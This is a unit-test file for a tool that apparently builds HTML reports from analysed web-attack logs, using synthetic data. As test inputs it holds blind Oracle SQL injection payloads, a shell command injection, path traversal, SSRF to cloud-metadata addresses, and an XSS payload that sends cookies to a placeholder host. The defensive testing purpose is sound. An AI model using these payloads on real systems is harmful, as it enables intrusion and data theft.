"""Synthetic-only tests for report_builder (.invalid hosts, RFC 5737 addresses, no real incident data)."""
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import report_builder  # noqa: E402

KW_FROM = 'FR' + 'OM'


def unit(uid, cat, value, ts, site='a.invalid', path='/p', param='q', rules=('rce.os_command_recon',), own=None,
         artifacts=None, ip='192.0.2.7', status='200', segments=None, hint=None):
    art = {'urls': [], 'hosts': [], 'file_paths': [], 'db_objects': [], 'functions': [], 'commands': []}
    art.update(artifacts or {})
    return {
        'unit_id': 'unit_' + uid, 'parameter_name': param, 'effective_category': cat,
        'first_seen': ts + ' UTC', 'last_seen': ts + ' UTC', 'final_decoded_value': value,
        'occurrences': [{'target': {'site': site, 'uri_path': path}, 'source_jsonl_line': 1,
                         'activity': {'source_ips': [ip], 'first_seen': ts + ' UTC', 'request_count': 2,
                                      'statuses': [status]}}],
        'analysis': {'category': own if own is not None else cat, 'rule_ids': list(rules), 'summary': 'synthetic',
                     'techniques': [], 'artifacts': art, 'shell_segments': segments or [], 'dbms_hint': hint},
    }


def blind(n):
    return ('1 AND AS' + 'CII(SUB' + 'STR((SELECT username ' + KW_FROM + ' all_' + 'users WHERE rownum=1),1,1))>'
            + str(n))


def search(target, lo=0, hi=127):
    """Thresholds a binary-search attacker would send for one character."""
    out = []
    while lo < hi:
        mid = (lo + hi) // 2
        out.append(mid)
        if target > mid:
            lo = mid + 1
        else:
            hi = mid
    return out


def make_report():
    units = [
        unit('a1', 'rce', 'x;' + 'i' + 'd', '2026-01-01 10:00:00', artifacts={'urls': ['http://cb.invalid/x']},
             segments=[{'program': 'i' + 'd', 'arguments': ['-u'], 'family': 'recon'}],
             rules=('rce.shell_command_injection',)),
        unit('c3', 'not_attack', 'benign-text', '2026-01-01 08:00:00'),
        unit('c4', 'not_attack', 'benign-text-2', '2026-01-01 08:10:00', ip='192.0.2.51'),
        unit('d4', 'xss', '"><svg onload=x>', '2026-01-01 15:05:00', rules=('xss.synthetic',)),
        unit('e5', 'ssrf', 'http://10.0.0.5:8080/admin', '2026-01-01 15:10:00', rules=('ssrf.synthetic',),
             artifacts={'urls': ['http://10.0.0.5:8080/admin']}),
        unit('f6', 'file_access', '..%2f..%2f..%2fdata/secret.txt', '2026-01-01 15:20:00',
             rules=('file_access.path_traversal',)),
        unit('g7', 'sqli', '1 AND 1=1', '2026-01-01 14:00:00', path='/s', rules=('sqli.boolean_tautology',)),
        unit('g8', 'sqli', "1 AND (SELECT COUNT(*) " + KW_FROM + " all_" + "tables WHERE owner='APP')>3",
             '2026-01-01 14:01:00', path='/s', rules=('sqli.oracle_dictionary_query',),
             artifacts={'db_objects': ['all_' + 'tables']}, hint='Oracle'),
        unit('g9', 'sqli', 'tick', '2026-01-01 14:01:30', path='/s', rules=(), own='undetermined'),
    ]
    for i, n in enumerate(search(107)):
        units.append(unit('h{:02d}'.format(i), 'sqli', blind(n), '2026-01-01 14:02:{:02d}'.format(i), path='/s',
                          rules=('sqli.boolean_blind.char_compare',)))
    return {'meta': {'generated_at': '2026-01-01T00:00:00+00:00', 'units_total': len(units)},
            'units': units, 'series': []}


REPORT = make_report()


class ExtractionTest(unittest.TestCase):
    def test_inference_parse_and_bounds(self):
        found = report_builder.extract_inference(blind(77))
        self.assertEqual(len(found), 1)
        kind, expr, pos, op, thr = found[0]
        self.assertEqual((kind, pos, op, thr), ('char', 1, '>', 77))
        self.assertIn('all_' + 'users', expr)
        seq = [('>', t) for t in search(107)]
        lo, hi, ok = report_builder.derive_bounds(seq)
        self.assertTrue(ok)
        self.assertLessEqual(lo, 107)
        self.assertGreaterEqual(hi, 107)
        self.assertLessEqual(hi - lo, 1)
        count = report_builder.extract_inference('1 AND (SELECT COUNT(*) ' + KW_FROM + ' t)>5')
        self.assertEqual(count[0][0], 'count')
        length = report_builder.extract_inference('LENGTH(USER)>4')
        self.assertEqual(length[0][:2], ('length', 'USER'))

    def test_file_target(self):
        osname, target, depth, wrapper, unc = report_builder.file_target('..%2f..%2f..%2fdata/secret.txt')
        self.assertEqual((target, depth), ('/data/secret.txt', 3))
        self.assertEqual(report_builder.file_target('C:\\data\\x.cfg')[0], 'Windows')
        self.assertEqual(report_builder.file_target('\\\\share.invalid\\c\\x')[4], 'share.invalid')
        self.assertEqual(report_builder.file_target('file:///data/x')[3], 'file')


class ModelTest(unittest.TestCase):
    def test_model(self):
        m = report_builder.build_model(REPORT)
        self.assertEqual([c[0] for c in m['cats']], ['rce', 'file_access', 'sqli', 'xss', 'ssrf'])
        self.assertEqual(m['scope']['units']['xss'], 1)
        self.assertEqual(m['scope']['units']['ssrf'], 1)
        self.assertEqual(m['scope']['unrelated'], 2)
        self.assertEqual(m['scope']['related'], 1)
        self.assertTrue({'xss', 'ssrf'} <= {e[1] for e in m['events']})
        text = json.dumps(m)
        self.assertNotIn('benign-text', text)
        self.assertNotIn('series', text.lower().replace('xss.synthetic', ''))
        labels = {n[1] for n in m['graph']['nodes']}
        self.assertIn('cb.invalid', labels)  # URL reduced to its site
        self.assertNotIn('http://cb.invalid/x', labels)
        self.assertIn('ssrf.synthetic', labels)
        rel = [u for u in m['units'] if u['related']][0]
        self.assertTrue(m['tech_names'][rel['rules'][0]].startswith('related to '))
        # Only non-attack requests from attacking IPs form the timeline shadow.
        cr = m['crawl']
        self.assertEqual(cr['hours'], [[report_builder.parse_ts('2026-01-01 08:00:00 UTC') // 3600 * 3600, 2, ['192.0.2.7'], [2]]])
        self.assertEqual((cr['requests'], cr['other_requests']), (2, 2))

    def test_evolution(self):
        m = report_builder.build_model(REPORT)
        e = m['evo']
        self.assertIn('Oracle', {r[1] for r in e['dbms']})
        self.assertIn(('dictionary view', 'all_' + 'tables'), {(r[1], r[2]) for r in e['objects']})
        self.assertIn(('name filter: owner', 'APP'), {(r[1], r[2]) for r in e['objects']})
        chars = [r for r in e['inference'] if r[1] == 'char']
        self.assertEqual(len(chars), 1)
        self.assertIn('k', chars[0][7])
        self.assertIn(('i' + 'd -u', 'recon'), {(r[1], r[2]) for r in e['commands']})
        self.assertIn(('10.0.0.5', '8080'), {(r[3], r[4]) for r in e['ssrf']})
        self.assertIn('/data/secret.txt', {r[2] for r in e['files']})
        self.assertEqual(len(e['xss']), 1)
        sq = [c for c in m['campaigns'] if 'sqli' in c['cats']][0]
        self.assertTrue(any('SQL injection stages' in t for t in sq['narrative']))
        lanes = {u['lane'] for u in m['units'] if u['cat'] == 'sqli'}
        self.assertEqual(lanes, {'syntax / boolean probing', 'metadata enumeration'})


class HtmlTest(unittest.TestCase):
    def test_html_deterministic_and_encoded(self):
        with tempfile.TemporaryDirectory() as d:
            src = Path(d) / 'in.json'
            src.write_text(json.dumps(REPORT), encoding='utf-8')
            outs = []
            for name in ('a.html', 'b.html'):
                report_builder.main([str(src), '-o', str(Path(d) / name)])
                outs.append((Path(d) / name).read_bytes())
        self.assertEqual(outs[0], outs[1])
        self.assertNotIn(b'svg onload', outs[0])
        self.assertNotIn(b'a.invalid', outs[0])

    def test_ip_intel_from_cache_without_network(self):
        import abuseipdb_check
        cache = {'ips': {'192.0.2.7': {'abuseConfidenceScore': 88, 'countryCode': 'ZZ', 'isp': 'Example ISP',
                                       'usageType': 'Data Center', 'totalReports': 12, 'isTor': True,
                                       'lastReportedAt': '2026-01-01T00:00:00+00:00'}}}
        with tempfile.TemporaryDirectory() as d, \
                mock.patch.object(abuseipdb_check, 'public', lambda ip: True), \
                mock.patch.object(abuseipdb_check, 'check', side_effect=AssertionError('network')):
            src = Path(d) / 'in.json'
            src.write_text(json.dumps(REPORT), encoding='utf-8')
            (Path(d) / 'r.ip_intel.json').write_text(json.dumps(cache), encoding='utf-8')
            outs = []
            for _ in range(2):
                report_builder.main([str(src), '-o', str(Path(d) / 'r.html')])
                outs.append((Path(d) / 'r.html').read_bytes())
            report_builder.main([str(src), '-o', str(Path(d) / 'plain.html')])
            plain = (Path(d) / 'plain.html').read_bytes()
        self.assertEqual(outs[0], outs[1])
        self.assertNotEqual(outs[0], plain)
        self.assertNotIn(b'Example ISP', outs[0])
        m = report_builder.build_model(REPORT, intel={'192.0.2.7': report_builder.intel_entry(
            cache['ips']['192.0.2.7'], ['source'])})
        self.assertEqual(m['intel']['192.0.2.7']['score'], 88)
        e = report_builder.intel_entry
        self.assertEqual(e({'usageType': 'Data Center/Web Hosting/Transit'}, [])['infra'], 'hosting / datacenter')
        self.assertEqual(e({'usageType': 'Data Center/Web Hosting/Transit', 'isTor': True}, [])['infra'], 'Tor exit')
        self.assertEqual(e({'usageType': 'Fixed Line ISP'}, [])['infra'], 'residential / fixed-line ISP')
        self.assertEqual(e({'usageType': 'Mobile ISP'}, [])['infra'], 'mobile carrier')
        self.assertEqual(e({}, [])['infra'], 'unknown')
        self.assertIn('hosting / datacenter', m['infra_note'])
        self.assertNotIn('intel', report_builder.build_model(REPORT))


if __name__ == '__main__':
    unittest.main()


class PhaseAndDetailTest(unittest.TestCase):
    def phase(self, cat, lane, text, rules=(), segments=None, files=None):
        analysis = {'artifacts': {'file_paths': files or []}, 'shell_segments': segments or []}
        return report_builder.phase_of(cat, lane, list(rules), analysis, text)

    def test_sqli_phase(self):
        self.assertEqual(self.phase('sqli', '', '1 AND 1=1'), 'probing')
        self.assertEqual(self.phase('sqli', '', blind(80)), 'enumeration')  # dictionary view: enumeration
        self.assertEqual(self.phase('sqli', '', '1 UNION ' + 'SELECT NULL ' + KW_FROM + ' DUAL'), 'probing')
        self.assertEqual(self.phase('sqli', '', '1 AND AS' + 'CII(SUB' + 'STR((SELECT token ' + KW_FROM
                                    + ' app.accounts WHERE id=1),1,1))>64'), 'extraction')

    def test_other_phases(self):
        seg = lambda p: [{'program': p, 'arguments': []}]
        self.assertEqual(self.phase('rce', 'command execution', 'x', segments=seg('sle' + 'ep')), 'probing')
        self.assertEqual(self.phase('rce', 'command execution', 'x', segments=seg('/bin/rm')), 'exploitation')
        self.assertEqual(self.phase('rce', 'callback / download', 'x', rules=['rce.download']), 'exploitation')
        self.assertEqual(self.phase('rce', 'template / recon probing', 'x'), 'probing')
        self.assertEqual(self.phase('file_access', '', '../../etc/pass' + 'wd'), 'probing')
        self.assertEqual(self.phase('file_access', '', '../../app/config.yml'), 'exploitation')
        self.assertEqual(self.phase('xss', '', '<svg onload=alert(1)>'), 'probing')
        self.assertEqual(self.phase('xss', '', '<svg onload=fetch("//x.invalid/"+document.cookie)>'), 'exploitation')
        self.assertEqual(self.phase('ssrf', '', 'http://169.254.169.254/latest/'), 'exploitation')
        self.assertEqual(self.phase('ssrf', '', 'http://cb.invalid/'), 'probing')

    def test_inference_target_and_detail_ids(self):
        t = report_builder.inference_target
        self.assertEqual(t('@@version'), 'environment fingerprint')
        self.assertEqual(t('DATABASE()'), 'environment fingerprint')
        self.assertEqual(t('SELECT name ' + KW_FROM + ' information_schema.tables'), 'schema enumeration')
        self.assertEqual(t('SELECT token ' + KW_FROM + ' app.accounts WHERE id=1'), 'stored data: app.accounts')
        m = report_builder.build_model(REPORT)
        inf = [r for r in m['evo']['inference'] if r[1] == 'char'][0]
        self.assertEqual(inf[11], 'schema enumeration')
        self.assertEqual(len(inf[12]), inf[4])  # one comparison per payload
        self.assertEqual(len(inf[13]), inf[4])  # payload ids behind the row
        self.assertTrue(all(isinstance(r[-1], list) and r[-1] for r in m['evo']['objects']))
        self.assertEqual({u['phase'] for u in m['units']}, {'probing', 'enumeration', 'exploitation'})
        self.assertTrue(all(len(e) == 8 and e[4] == sum(n for _, n in e[7]) for e in m['events']))

    def test_probe_refinements(self):
        seg = lambda *ps: [{'program': p, 'arguments': []} for p in ps]
        self.assertEqual(self.phase('rce', 'command execution', 'x', segments=seg('i' + 'd/', '1', '/c')), 'probing')
        self.assertEqual(self.phase('rce', 'command execution', 'x', segments=seg('cm' + 'd.exe', '(echo', 'ipconfig)')), 'probing')
        self.assertEqual(self.phase('rce', 'command execution', 'x', segments=seg('del', 'rmdir')), 'exploitation')
        self.assertEqual(self.phase('rce', 'command execution', 'x', rules=['rce.x.time_delay']), 'probing')
        exists = '1 AND (SELECT COUNT(*) ' + KW_FROM + ' APP.NODES)>0'
        self.assertEqual(self.phase('sqli', '', exists), 'probing')
        self.assertEqual(self.phase('sqli', '', '1 AND 1=(SELECT 1 ' + KW_FROM + ' APP.NODES WHERE rownum=1)'), 'probing')
        self.assertEqual(self.phase('sqli', '', '1 AND 1=(SELECT name ' + KW_FROM + ' APP.NODES WHERE rownum=1)'), 'extraction')
        self.assertEqual(self.phase('file_access', '', '../../../../etc'), 'probing')
        self.assertEqual(report_builder.inference_target("'MARK'"), 'environment fingerprint')

    def test_graph_main_entities(self):
        e = report_builder.main_entity
        self.assertEqual(e(('url', 'http://198.51.100.9:8080/a/b.jsp?x=1')), ('ip', '198.51.100.9'))
        self.assertEqual(e(('url', 'https://cb.invalid/x')), ('host', 'cb.invalid'))
        self.assertEqual(e(('unc', '\\share.invalid')), ('host', 'share.invalid'))
        self.assertIsNone(e(('url', 'ile:///path1')))
        self.assertIsNone(e(('email', 'x.invalid@127.0.0.1')))
        self.assertEqual(e(('email', 'a@x.invalid')), ('email', 'a@x.invalid'))
        self.assertEqual(report_builder.target_entity('a.invalid', '/app/x/login.jsp'), 'login.jsp')
        self.assertEqual(report_builder.target_entity('a.invalid', '/'), 'a.invalid')

    def test_inference_values_compact(self):
        self.assertEqual(report_builder.comparison_steps([('>', 63), ('>', 95), ('>', 79)]), '63↑ 95↓ 79?')
        self.assertEqual(report_builder.char_candidates(82, 83, True), '[RS]')
        self.assertEqual(report_builder.char_candidates(65, 65, True), 'A')
        self.assertEqual(report_builder.char_candidates(64, 80, True), '·')
        self.assertEqual(report_builder.char_candidates(1, 2, False), '!')
        rows = report_builder.build_model(REPORT)['evo']['strings']
        r = [x for x in rows if x[5]][0]  # the expression read character by character
        self.assertEqual(len(r), 12)  # 9 visible fields + payload ids + no sequence + per-position detail
        self.assertIn('k', r[3])
        self.assertTrue(r[9] and r[11])
        self.assertEqual(r[6], sum(len(x[4].split()) for x in r[11]))  # requests = comparisons over all positions

    def test_no_row_caps(self):
        m = report_builder.build_model(REPORT, ioc_top=1)
        g = m['graph']
        self.assertEqual(len(g['all_iocs']), g['ioc_total'])  # the picture is capped, the list is not
        self.assertTrue(g['all_targets'])
        self.assertFalse(any(u['truncated'] for u in m['units']))
        self.assertFalse(any(c['omitted'] for c in m['campaigns']))
        self.assertFalse(hasattr(report_builder, 'MAX_CAMPAIGN_ROWS'))

    def test_find_counts_encoded_html(self):
        m = report_builder.build_model(REPORT)
        html = report_builder.render(m)
        site = m['units'][0]['site']
        self.assertNotIn(site, html)  # the data is embedded encoded
        self.assertIn(site, report_builder.decode_html(html))
        out = report_builder.find_text(REPORT, [site], m, html)
        self.assertIn('in the existing HTML report (decoded): ', out)
        self.assertNotIn('(decoded): 0 ', out + ' ')

    def test_focus_model_filters_every_view(self):
        import json as _json
        import re
        import shutil
        import subprocess
        node = shutil.which('node')
        if not node:
            self.skipTest('node not available')
        m = report_builder.build_model(REPORT)
        page = report_builder.render(m)
        self.assertIn('id="focus"', page)
        js = re.findall(r'<script[^>]*>(.*?)</script>', page, re.S)[-1]
        fn = re.search(r'(function focusModel\(.*?)\nfunction decode\(\)', js, re.S).group(1)
        q = m['units'][0]['site']
        want = [u['id'] for u in m['units'] if q.lower() in ' '.join(
            [u['value'], u['site'], u['path'], u['param'], ' '.join(u['ips']), u['summary']]).lower()]
        check = fn + """
const D=JSON.parse(require('fs').readFileSync(process.argv[2],'utf8'));focusModel(D,process.argv[3]);
const ids=new Set(D.units.map(u=>u.id));let ok=D.graph.nodes.every(n=>n[3]===n[4].length&&n[4].every(i=>i<D.units.length));
for(const k of Object.keys(D.evo))for(const r of D.evo[k]){const x=k==='inference'?r[13]:k==='strings'?r[9]:r[r.length-1];ok=ok&&x.length>0&&x.every(i=>ids.has(i));}
ok=ok&&D.campaigns.every(c=>c.units===D.units.filter(u=>u.camp===c.id).length);
ok=ok&&D.events.length>0&&D.events.every(e=>typeof e[4]==='number'&&e[4]>0&&typeof e[5]==='string'&&e[7].every(i=>ids.has(i[0])));
ok=ok&&D.phases.every(p=>Object.values(p.cats).every(v=>typeof v==='number'));
console.log(JSON.stringify({ids:D.units.map(u=>u.id),ok,events:D.events.length,ereq:D.events.reduce((a,e)=>a+e[4],0),req:Object.values(D.scope.requests).reduce((a,b)=>a+b,0)}));"""
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / 'f.js').write_text(check, encoding='utf-8')
            (Path(d) / 'm.json').write_text(_json.dumps(m), encoding='utf-8')
            r = subprocess.run([node, str(Path(d) / 'f.js'), str(Path(d) / 'm.json'), q.upper()],
                               capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr[-800:])
        out = _json.loads(r.stdout)
        self.assertTrue(want)
        self.assertEqual(out['ids'], want)
        self.assertTrue(out['ok'])
        self.assertEqual(out['req'], sum(u['count'] for u in m['units'] if u['id'] in set(want)))
        keep = set(want)
        self.assertEqual(out['ereq'], sum(n for e in m['events'] for i, n in e[7] if i in keep))

    def test_hosts_in_sql_text_are_network_artifacts(self):
        an = {'category': 'sqli', 'artifacts': {}}
        cases = {
            "' AND 1=(SELECT COUNT(*) FROM S1.T1@LINK1.DEPT.EXAMPLE.INT)--": {('host', 'link1.dept.example.int')},
            "' AND (SELECT host FROM t) LIKE '%srv1.dept.eu.example%'--": {('host', 'srv1.dept.eu.example')},
            "' AND (SELECT host FROM t)='srv2.corp.example.int'--": {('host', 'srv2.corp.example.int')},
            "' AND LOOKUP('srv3.example.invalid')='1'--": {('host', 'srv3.example.invalid')},
            "' AND SCHEMA_A.TABLE_B.COL_C=1 AND PKG.FN(1)=1 AND usr.id=2--": set(),
        }
        for value, want in cases.items():
            got = {report_builder.main_entity(i) for i in report_builder.unit_iocs({'final_decoded_value': value}, an)}
            self.assertEqual(got - {None}, want, value)
        # a quoted address inside SQL stays an email
        got = report_builder.unit_iocs({'final_decoded_value': "';UPDATE s SET n='a@b.example.int' WHERE x='"}, an)
        self.assertIn(('email', 'a@b.example.int'), got)
        # a quoted database link name is a host
        got = report_builder.unit_iocs({'final_decoded_value': '(SELECT 1 FROM DUAL@"LINK2.EXAMPLE.INT")'}, an)
        self.assertIn(('host', 'link2.example.int'), got)
        # outside SQL an address stays an email
        got = report_builder.unit_iocs({'final_decoded_value': 'mail a@b.example.int'}, {'category': 'xss'})
        self.assertIn(('email', 'a@b.example.int'), got)

    def test_embedded_script_parses(self):
        import re
        import shutil
        import subprocess
        node = shutil.which('node')
        if not node:
            self.skipTest('node not available')
        page = report_builder.render(report_builder.build_model(REPORT))
        with tempfile.TemporaryDirectory() as d:
            js = Path(d) / 'r.js'
            js.write_text(re.findall(r'<script[^>]*>(.*?)</script>', page, re.S)[-1], encoding='utf-8')
            r = subprocess.run([node, '--check', str(js)], capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stderr[-800:])
